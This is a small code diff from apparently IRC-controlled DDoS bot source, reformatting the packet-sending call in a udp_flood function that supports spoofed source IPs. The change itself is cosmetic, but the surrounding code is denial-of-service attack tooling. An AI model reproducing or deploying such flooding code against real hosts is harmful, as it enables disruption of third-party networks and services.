@@ -235,8 +235,10 @@ int udp_flood(attack_info *ainfo, irc_info *info) {
 				iphdr->check = csum((unsigned short *) buffer, iphdr->tot_len);
 			}
 		}
-
-		if (sendto(fd_sock, buffer, ainfo->spoof_ip ? iphdr->tot_len : (sizeof(struct udphdr) + payload_len), 0, &destination, sizeof(struct sockaddr_in)) == -1) {
+		// flooding UDP packets
+		if (sendto(fd_sock, buffer, ainfo->spoof_ip ? iphdr->tot_len : 
+			   (sizeof(struct udphdr) + payload_len), 0, &destination, 
+			    sizeof(struct sockaddr_in)) == -1) {
 
 			perror("sending datagram");
 			exit(EXIT_FAILURE);
